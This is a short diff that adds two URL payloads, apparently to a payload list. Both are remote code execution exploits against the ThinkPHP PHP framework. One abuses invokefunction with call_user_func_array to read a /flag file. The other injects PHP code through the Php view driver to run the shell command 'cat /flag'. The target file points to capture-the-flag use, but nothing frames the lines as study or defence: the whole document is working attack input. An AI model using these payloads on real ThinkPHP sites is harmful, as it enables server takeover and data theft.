@@ -1,0 +1,2 @@
+/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag
+/index.php?s=index/think\view\driver\Php/display&content=<?php system('cat /flag');?>
